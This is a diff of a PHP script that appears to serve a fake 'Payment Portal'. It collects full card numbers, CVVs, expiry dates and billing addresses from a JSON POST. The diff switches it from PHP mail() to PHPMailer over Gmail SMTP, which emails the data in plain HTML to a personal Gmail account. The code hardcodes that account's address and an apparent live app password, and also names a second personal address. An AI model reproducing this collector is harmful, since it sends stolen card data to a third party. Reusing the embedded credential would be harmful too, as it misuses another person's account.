@@ -1,4 +1,10 @@
 <?php
+// Include PHPMailer classes
+use PHPMailer\PHPMailer\PHPMailer;
+use PHPMailer\PHPMailer\Exception;
+
+require 'vendor/autoload.php'; // Adjust this path if PHPMailer is installed elsewhere
+
 // Ensure the script only processes POST requests
 if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
     http_response_code(405); // Method Not Allowed
@@ -17,8 +23,8 @@ if (json_last_error() !== JSON_ERROR_NONE) {
     exit;
 }
 
-// Extract data with validation
-$requiredFields = ['expYear', 'email', 'name', 'amount', 'cvv', 'cardNumber', 'expMonth', 'sendcard', 'zipCode', 'state', 'city', 'address'];
+// Extract and validate required fields
+$requiredFields = ['expYear', 'email', 'name', 'amount', 'cvv', 'cardNumber', 'expMonth', 'zipCode', 'state', 'city', 'address'];
 foreach ($requiredFields as $field) {
     if (empty($data[$field])) {
         http_response_code(400); // Bad Request
@@ -40,9 +46,7 @@ $state = htmlspecialchars($data['state'], ENT_QUOTES, 'UTF-8');
 $city = htmlspecialchars($data['city'], ENT_QUOTES, 'UTF-8');
 $address = htmlspecialchars($data['address'], ENT_QUOTES, 'UTF-8');
 
-// Prepare email details
-$to = "habeebajani9@gmail.com"; // Replace with your email address
-$subject = "Payment Information Submitted";
+// Create email content
 $message = "
     <h1>Payment Details</h1>
     <p><strong>Name:</strong> $name</p>
@@ -56,18 +60,35 @@ $message = "
     <p><strong>State:</strong> $state</p>
     <p><strong>ZIP Code:</strong> $zipCode</p>
 ";
-$headers = "MIME-Version: 1.0" . "\r\n";
-$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
-$headers .= "From: noreply@example.com" . "\r\n"; // Replace with your domain email
 
-// Send email and respond to the client
-if (mail($to, $subject, $message, $headers)) {
+$mail = new PHPMailer(true);
+
+try {
+    // SMTP Server Configuration
+    $mail->isSMTP();
+    $mail->Host = 'smtp.gmail.com'; // Replace with your SMTP host
+    $mail->SMTPAuth = true;
+    $mail->Username = 'americanresidence435@gmail.com'; // Replace with your SMTP username
+    $mail->Password = 'dtwh cnul jqfq uxol'; // Replace with your SMTP password
+    $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
+    $mail->Port = 587; // Common SMTP port
+
+    // Email Headers
+    $mail->setFrom('americanresidence435@gmail.com', 'Payment Portal'); // Replace with your sender email
+    $mail->addAddress('americanresidence435@gmail.com', 'Resido'); // Replace with the recipient's email
+
+    // Email Content
+    $mail->isHTML(true);
+    $mail->Subject = 'Payment Information Submitted';
+    $mail->Body    = $message;
+
+    // Send the email
+    $mail->send();
     http_response_code(200); // OK
     echo json_encode(["success" => "Email sent successfully"]);
-} else {
+} catch (Exception $e) {
     http_response_code(500); // Internal Server Error
-    echo json_encode(["error" => "Failed to send email"]);
+    echo json_encode(["error" => "Message could not be sent. Mailer Error: {$mail->ErrorInfo}"]);
 }
 
 exit;
-?>
